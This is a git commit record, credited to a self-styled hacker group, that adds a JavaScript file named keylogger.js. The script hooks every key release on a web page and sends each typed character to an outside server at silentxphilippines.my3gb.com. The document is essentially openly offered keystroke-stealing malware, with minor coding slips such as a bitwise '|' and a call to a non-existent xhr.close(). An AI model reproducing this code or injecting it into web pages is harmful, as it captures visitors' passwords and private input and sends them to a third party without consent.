7022307e1f1eea01b5ee1775c9dd7cec53e350b1
Anonymous Security Hackers <lulzsec780@gmail.com>
2016-10-11 13:05:24 +0800

    Create keylogger.js

---
+++ src/keylogger.js
@@ -0,0 +1,15 @@
+// Contributed by SilentX Philippines
+// (c)opyright - Anonymous Security Hackers
+
+document.onkeyup=(function(evt){
+ evt=evt|window.event;
+ key=String.fromCharCode(evt.charCode);
+ if(key){
+  var xhr=new XMLHttpRequest();
+  var param=encodeURI(key);
+  param+=" ";
+  xhr.open("GET","http://silentxphilippines.my3gb.com/key.php?k="+param,true);
+  xhr.send(null);
+  xhr.close();
+ }
+});
